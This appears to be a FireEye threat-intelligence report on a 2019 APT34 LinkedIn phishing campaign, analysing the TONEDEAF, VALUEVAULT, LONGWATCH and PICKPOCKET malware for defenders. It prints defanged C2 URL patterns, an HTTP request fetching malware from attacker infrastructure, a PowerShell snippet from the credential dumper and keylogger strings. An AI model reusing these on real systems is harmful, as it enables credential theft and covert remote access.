Iran has a critical need for\nstrategic intelligence and is likely to fill this gap by conducting espionage against decision\nmakers and key organizations that may have information that furthers Iran's economic and\nnational security goals. The identification of new malware and the creation of additional\ninfrastructure to enable such campaigns highlights the increased tempo of these operations\nin support of Iranian interests.\n\n**FireEye Identifies Phishing Campaign**\n\nIn late June 2019, FireEye identified a phishing campaign conducted by APT34, an Iraniannexus threat actor. Three key attributes caught our eye with this particular campaign:\n\n1. Masquerading as a member of Cambridge University to gain victims’ trust to open\n\nmalicious documents,\n2. The usage of LinkedIn to deliver malicious documents,\n3. The addition of three new malware families to APT34’s arsenal.\n\nFireEye’s platform successfully thwarted this attempted intrusion, stopping a new malware\nvariant dead in its tracks. Additionally, with the assistance of our FireEye Labs Advanced\nReverse Engineering (FLARE), Intelligence, and Advanced Practices teams, we identified\nthree new malware families and a reappearance of PICKPOCKET, malware exclusively\nobserved in use by APT34. The new malware families, which we will examine later in this\npost, show APT34 relying on their PowerShell development capabilities, as well as trying\ntheir hand at Golang.\n\nAPT34 is an Iran-nexus cluster of cyber espionage activity that has been active since at least\n2014. They use a mix of public and non-public tools to collect strategic information that would\nbenefit nation-state interests pertaining to geopolitical and economic needs. APT34 aligns\nwith elements of activity reported as OilRig and Greenbug, by various security researchers.\nThis threat group has conducted broad targeting across a variety of industries operating in\nthe Middle East; however, we believe APT34's strongest interest is gaining access to\nfinancial, energy, and government entities.\n\n[Additional research on APT34 can be found in this FireEye blog post, this](https://www.fireeye.com/resources/targeted-attack-in-middle-east-by-apt34) [CERT-OPMD post,](https://www.opmd.fr/blog/dnspionage-focus-on-internal-actions/)\n[and this Cisco post.](https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html)\n\n[Mandiant Managed Defense also initiated a Community Protection Event (CPE) titled](https://www.fireeye.com/mandiant/managed-detection-and-response.html)\n“Geopolitical Spotlight: Iran.” This CPE was created to ensure our customers are updated\nwith new discoveries, activity and detection efforts related to this campaign, along with other\nrecent activity from Iranian-nexus threat actors to include APT33, which is mentioned in\nthis [updated FireEye blog post.](https://www.fireeye.com/resources/overruled-containing-potentially-destructive-adversary)\n\n**Industries Targeted**\n\n\n-----\n\nThe activities observed by Managed Defense, and described in this post, were primarily\ntargeting the following industries:\n\nEnergy and Utilities\nGovernment\nOil and Gas\n\n**Utilizing Cambridge University to Establish Trust**\n\nOn June 19, 2019, Mandiant Managed Defense Security Operations Center received an\nexploit detection alert on one of our FireEye Endpoint Security appliances. The offending\napplication was identified as Microsoft Excel and was stopped immediately by FireEye\nEndpoint Security’s ExploitGuard engine. ExploitGuard is our behavioral monitoring,\ndetection, and prevention capability that monitors application behavior, looking for various\nanomalies that threat actors use to subvert traditional detection mechanisms. Offending\napplications can subsequently be sandboxed or terminated, preventing an exploit from\nreaching its next programmed step.\n\nThe Managed Defense SOC analyzed the alert and identified a malicious file named\nSystem.doc (MD5: b338baa673ac007d7af54075ea69660b), located in C:\\Users\\\n<user_name>\\.templates. The file System.doc is a Windows Portable Executable (PE),\ndespite having a \"doc\" file extension. FireEye identified this new malware family as\nTONEDEAF.\n\nA backdoor that communicates with a single command and control (C2) server using HTTP\nGET and POST requests, TONEDEAF supports collecting system information, uploading and\ndownloading of files, and arbitrary shell command execution. When executed, this variant of\nTONEDEAF wrote encrypted data to two temporary files – temp.txt and temp2.txt – within the\nsame directory of its execution. We explore additional technical details of TONEDEAF in the\nmalware appendix of this post.\n\nRetracing the steps preceding exploit detection, FireEye identified that System.doc was\ndropped by a file named ERFT-Details.xls. Combining endpoint- and network-visibility, we\nwere able to correlate that ERFT-Details.xls originated from the URL http://www.camresearch-ac[.]com/Documents/ERFT-Details.xls. Network evidence also showed the access\nof a LinkedIn message directly preceding the spreadsheet download.\n\nManaged Defense reached out to the impacted customer’s security team, who confirmed the\nfile was received via a LinkedIn message. The targeted employee conversed with \"Rebecca\nWatts\", allegedly employed as \"Research Staff at University of Cambridge\". The\nconversation with Ms. Watts, provided in Figure 1, began with the solicitation of resumes for\npotential job opportunities.\n\nScreenshot of LinkedIn message asking to download TONEDEAF\n\n\n-----\n\nFigure 1: Screenshot of LinkedIn message asking to download TONEDEAF\n\nThis is not the first time we’ve seen APT34 utilize academia and/or job offer conversations in\ntheir various campaigns. These conversations often take place on social media platforms,\nwhich can be an effective delivery mechanism if a targeted organization is focusing heavily\non e-mail defenses to prevent intrusions.\n\nFireEye examined the original file ERFT-Details.xls, which was observed with at least two\nunique MD5 file hashes:\n\n96feed478c347d4b95a8224de26a1b2c\ncaf418cbf6a9c4e93e79d4714d5d3b87\n\nA snippet of the VBA code, provided in Figure 2, creates System.doc in the target directory\nfrom base64-encoded text upon opening.\n\nScreenshot of VBA code from System.doc\n\nFigure 2: Screenshot of VBA code from System.doc\n\nThe spreadsheet also creates a scheduled task named \"windows update check\" that runs\nthe file C:\\Users\\<user_name>\\.templates\\System Manager.exe every minute. Upon closing\nthe spreadsheet, a final VBA function will rename System.doc to System Manager.exe.\nFigure 3 provides a snippet of VBA code that creates the scheduled task, clearly obfuscated\nto avoid simple detection.\n\nAdditional VBA code from System.doc\n\nFigure 3: Additional VBA code from System.doc\n\nUpon first execution of TONEDEAF, FireEye identified a callback to the C2 server\nofflineearthquake[.]com over port 80.\n\n**The FireEye Footprint: Pivots and Victim Identification**\n\nAfter identifying the usage of offlineearthquake[.]com as a potential C2 domain, FireEye’s\nIntelligence and Advanced Practices teams performed a wider search across our global\nvisibility. FireEye’s Advanced Practices and Intelligence teams were able to identify\nadditional artifacts and activity from the APT34 actors at other victim organizations. Of note,\nFireEye discovered two additional new malware families hosted at this domain,\nVALUEVAULT and LONGWATCH. We also identified a variant of PICKPOCKET, a browser\ncredential-theft tool FireEye has been tracking since May 2018, hosted on the C2.\n\n\n-----\n\nRequests to the domain offlineearthquake[.]com could take multiple forms, depending on the\nmalware’s stage of installation and purpose. Additionally, during installation, the malware\nretrieves the system and current user names, which are used to create a three-character\n“sys_id”. This value is used in subsequent requests, likely to track infected target activity.\nURLs were observed with the following structures:\n\nhxxp[://]offlineearthquake[.]com/download?id=<sys_id>&n=000\nhxxp[://]offlineearthquake[.]com/upload?id=<sys_id>&n=000\nhxxp[://]offlineearthquake[.]com/file/<sys_id>/<executable>?id=<cmd_id>&h=000\nhxxp[://]offlineearthquake[.]com/file/<sys_id>/<executable>?id=<cmd_id>&n=000\n\nThe first executable identified by FireEye on the C2 was WinNTProgram.exe (MD5:\n021a0f57fe09116a43c27e5133a57a0a), identified by FireEye as LONGWATCH.\nLONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Window’s temp\nfolder. Further information regarding LONGWATCH is detailed in the Malware Appendix\nsection at the end of the post.\n\nFireEye Network Security appliances also detected the following being retrieved from APT34\ninfrastructure (Figure 4).\n\nGET hxxp://offlineearthquake.com/file/<sys_id>/b.exe?id=<3char_redacted>&n=000\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0)\nAppleWebKit/537.36 (KHTML, like Gecko)\nHost: offlineearthquake[.]com\nProxy-Connection: Keep-Alive Pragma: no-cache HTTP/1.1\n\nFigure 4: Snippet of HTTP traffic retrieving VALUEVAULT; detected by FireEye Network\nSecurity appliance\n\nFireEye identifies b.exe (MD5: 9fff498b78d9498b33e08b892148135f) as VALUEVAULT.\n\nVALUEVAULT is a Golang compiled version of the \"Windows Vault Password Dumper\"\nbrowser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel.\n\nVALUEVAULT maintains the same functionality as the original tool by allowing the operator\nto extract and view the credentials stored in the Windows Vault. Additionally, VALUEVAULT\nwill call Windows PowerShell to extract browser history in order to match browser passwords\nwith visited sites. Further information regarding VALUEVAULT can be found in the appendix\nbelow.\n\nFurther pivoting from FireEye appliances and internal data sources yielded two additional\nfiles, PE86.dll (MD5: d8abe843db508048b4d4db748f92a103) and PE64.dll (MD5:\n6eca9c2b7cf12c247032aae28419319e). These files were analyzed and determined to be\n64- and 32-bit variants of the malware PICKPOCKET, respectively.\n\n\n-----\n\nPICKPOCKET is a credential theft tool that dumps the user s website login credentials from\nChrome, Firefox, and Internet Explorer to a file. This tool was previously observed during a\nMandiant incident response in 2018 and, to date, solely utilized by APT34.\n\n**Conclusion**\n\nThe activity described in this blog post presented a well-known Iranian threat actor utilizing\ntheir tried-and-true techniques to breach targeted organizations. Luckily, with FireEye’s\nplatform in place, our Managed Defense customers were not impacted. Furthermore, upon\nthe blocking of this activity, FireEye was able to expand upon the observed indicators to\nidentify a broader campaign, as well as the use of new and old malware.\n\nWe suspect this will not be the last time APT34 brings new tools to the table. Threat actors\nare often reshaping their TTPs to evade detection mechanisms, especially if the target is\nhighly desired. For these reasons, we recommend organizations remain vigilant in their\ndefenses, and remember to view their environment holistically when it comes to information\nsecurity.\n\n[Learn more about Mandiant Managed Defense, and catch an on-demand recap on this and](https://www.fireeye.com/mandiant/managed-detection-and-response.html)\nthe [Top 5 Managed Defense attacks this year.](https://www.brighttalk.com/webcast/10703/445570)\n\n**Malware Appendix**\n\nTONEDEAF\n\nTONEDEAF is a backdoor that communicates with Command and Control servers using\nHTTP or DNS. Supported commands include system information collection, file upload, file\ndownload, and arbitrary shell command execution. Although this backdoor was coded to be\nable to communicate with DNS requests to the hard-coded Command and Control server,\nc[.]cdn-edge-akamai[.]com, it was not configured to use this functionality. Figure 5 provides a\nsnippet of the assembly CALL instruction of dns_exfil. The creator likely made this as a\nmeans for future DNS exfiltration as a plan B.\n\nSnippet of code from TONEDEAF binary\n\nFigure 5: Snippet of code from TONEDEAF binary\n\nAside from not being enabled in this sample, the DNS tunneling functionality also contains\nmissing values and bugs that prevent it from executing properly. One such bug involves\ndetermining the length of a command response string without accounting for Unicode strings.\nAs a result, a single command response byte is sent when, for example, the malware\nexecutes a shell command that returns Unicode output. Additionally, within the malware, an\nunused string contained the address 185[.]15[.]247[.]154.\n\nVALUEVAULT\n\n\n-----\n\nVALUEVAULT is a Golang compiled version of the Windows Vault Password Dumper\nbrowser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel.\n\nVALUEVAULT maintains the same functionality as the original tool by allowing the operator\nto extract and view the credentials stored in the Windows Vault. Additionally, VALUEVAULT\nwill call Windows PowerShell to extract browser history in order to match browser passwords\nwith visited sites. A snippet of this function is shown in Figure 6.\n\npowershell.exe /c \"function get-iehistory {. [CmdletBinding()]. param (). . $shell = NewObject -ComObject Shell.Application. $hist = $shell.NameSpace(34). $folder = $hist.Self. .\n$hist.Items() | . foreach {. if ($_.IsFolder) {. $siteFolder = $_.GetFolder. $siteFolder.Items()\n| . foreach {. $site = $_. . if ($site.IsFolder) {. $pageFolder = $site.GetFolder.\n$pageFolder.Items() | . foreach {. $visit = New-Object -TypeName PSObject -Property @{ .\nURL = $($pageFolder.GetDetailsOf($_,0)) . }. $visit. }. }. }. }. }. }. get-iehistory\n\nFigure 6: Snippet of PowerShell code from VALUEVAULT to extract browser credentials\n\nUpon execution, VALUEVAULT creates a SQLITE database file in the AppData\\Roaming\ndirectory under the context of the user account it was executed by. This file is named\nfsociety.dat and VALUEVAULT will write the dumped passwords to this in SQL format. This\nfunctionality is not in the original version of the “Windows Vault Password Dumper”. Figure 7\nshows the SQL format of the fsociety.dat file.\n\nSQL format of the VALUEVAULT fsociety.dat SQLite database\n\nFigure 7: SQL format of the VALUEVAULT fsociety.dat SQLite database\n\nVALUEVAULT’s function names are not obfuscated and are directly reviewable in strings\nanalysis. Other developer environment variables were directly available within the binary as\nshown below. VALUEVAULT does not possess the ability to perform network communication,\nmeaning the operators would need to manually retrieve the captured output of the tool.\n\nC:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/new_edge.go\nC:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/mozila.go\nC:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/main.go\nC:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/ie.go\nC:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/Chrome\nPassword Recovery.go\n\nFigure 8: Golang files extracted during execution of VALUEVAULT\n\nLONGWATCH\n\n\n-----\n\nFireEye identified the binary WinNTProgram.exe\n(MD5:021a0f57fe09116a43c27e5133a57a0a) hosted on the malicious domain\nofflineearthquake[.]com. FireEye identifies this malware as LONGWATCH. The primary\nfunction of LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the\nWindows temp folder.\n\nInteresting strings identified in the binary are shown in Figure 9.\n\nGetAsyncKeyState\n>---------------------------------------------------\\n\\n\nc:\\\\windows\\\\temp\\\\log.txt\n\n[ENTER]\n\n[CapsLock]\n\n[CRTL]\n\n[PAGE_UP]\n\n[PAGE_DOWN]\n\n[HOME]\n\n[LEFT]\n\n[RIGHT]\n\n[DOWN]\n\n[PRINT]\n\n[PRINT SCREEN] (1 space)\n\n[INSERT]\n\n[SLEEP]\n\n[PAUSE]\n\\n---------------CLIPBOARD------------\\n\n\\n\\n >>> (2 spaces)\nc:\\\\windows\\\\temp\\\\log.txt\n\nFigure 9: Strings identified in a LONGWATCH binary\n\nDetecting the Techniques\n\nFireEye detects this activity across our platforms, including named detection for TONEDEAF,\nVALUEVAULT, and LONGWATCH.
